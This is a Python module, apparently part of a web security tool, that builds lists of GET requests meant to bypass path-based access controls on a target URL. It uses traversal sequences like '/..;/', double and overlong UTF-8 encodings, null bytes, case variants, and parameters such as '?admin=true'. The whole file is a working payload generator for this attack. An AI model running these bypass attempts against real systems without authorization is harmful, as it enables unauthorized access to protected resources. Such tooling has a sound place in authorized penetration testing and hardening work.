#!/usr/bin/env python3
"""
Path-based bypass techniques
"""

import urllib.parse

class PathBypass:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate path-based bypass tests"""
        tests = []
        base_url = self.manager.target_url
        parsed = urllib.parse.urlparse(base_url)
        path = parsed.path if parsed.path else '/'
        
        # Path traversal patterns
        traversal_patterns = [
            '/.', '/..', '/../', '/../../', '/../../../',
            '/./', '/.././', '/./../',
            '/%2e/', '/%2e%2e/', '/%2e%2e%2f',
            '/..%2f', '/..%252f', '/..%c0%af',
            '/%252e%252e%252f', '/%252e%252e/',
            '/..;/', '/..;/..;/', '/..;/..;/../'
        ]
        
        # Path variants
        path_variants = [
            path,
            path + '/',
            path + '/.',
            path + '/..',
            path + '/%20',
            path + '/%00',
            path + '/%09',
            path + '/%0a',
            path + '/%0d',
            path + '/%2e',
            path + '/..%2f',
            path + '/%2e%2e%2f',
            path + '/.;',
            path + '/..;',
            path + '/...;',
            path + '/%3f',
            path + '/%23',
            path + '/%3f%3f',
            path + '/?',
            path + '/?q=',
            path + '/?test=',
            path + '/#',
            path + '/%252f',
            path + '/%2f%2e%2e',
            path + '/%2e%2e%5c',
            path + '/..%5c',
            path + '/%2e%2e%5c%2e%2e%5c',
            path + '/%c0%ae%c0%ae%c0%af',
            path + '/%c0%ae%c0%ae/',
            path + '/%c1%9c',
            path + '/%c1%9c%c1%9c',
        ]
        
        # URL encoded paths
        encoded_paths = [
            urllib.parse.quote(path, safe=''),
            urllib.parse.quote(path, safe='/'),
            urllib.parse.quote(path, safe=' /?=&'),
            urllib.parse.quote(path, safe='/:'),
            urllib.parse.quote(path, safe=''),
            urllib.parse.quote(path, safe=''),
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),
            path.replace('/', '%2F'),
            path.replace('/', '%252F'),
            path.replace('/', '%2f%2f'),
            path.replace('/', '%2f%252f'),
        ]
        
        # Case sensitivity tests
        case_tests = [
            path.upper(),
            path.lower(),
            path.title(),
            path.swapcase(),
            path.capitalize(),
            path.replace('/', '/'),
        ]
        
        # Add all path variants
        for variant in path_variants:
            new_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                variant,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            tests.append({
                'name': f'Path Bypass: {variant}',
                'url': new_url,
                'headers': {},
                'method': 'GET'
            })
        
        # Add traversal patterns
        for pattern in traversal_patterns:
            new_path = path + pattern
            new_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                new_path,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            tests.append({
                'name': f'Traversal Bypass: {pattern}',
                'url': new_url,
                'headers': {},
                'method': 'GET'
            })
        
        # Add encoded paths
        for encoded in encoded_paths:
            new_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                encoded,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            tests.append({
                'name': f'Encoded Path Bypass',
                'url': new_url,
                'headers': {},
                'method': 'GET'
            })
        
        # Add case sensitivity tests
        for case in case_tests:
            if case != path:
                new_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    case,
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))
                tests.append({
                    'name': f'Case Bypass: {case}',
                    'url': new_url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # Test with query parameters
        query_params = [
            '?a=b',
            '?%00',
            '?%00=test',
            '?test=',
            '?=',
            '?param=value',
            '?..;/',
            '?../',
            '?..%2f',
            '?%2e%2e%2f',
            '?file=index.php',
            '?page=admin',
            '?admin=true',
            '?debug=true',
            '?test=1',
            '?1=1'
        ]
        
        for param in query_params:
            new_url = base_url + param
            tests.append({
                'name': f'Query Parameter Bypass: {param}',
                'url': new_url,
                'headers': {},
                'method': 'GET'
            })
        
        # Test with fragment identifiers
        fragments = ['#', '#admin', '#test', '#bypass', '#section']
        for fragment in fragments:
            new_url = base_url + fragment
            tests.append({
                'name': f'Fragment Bypass: {fragment}',
                'url': new_url,
                'headers': {},
                'method': 'GET'
            })
        
        return tests
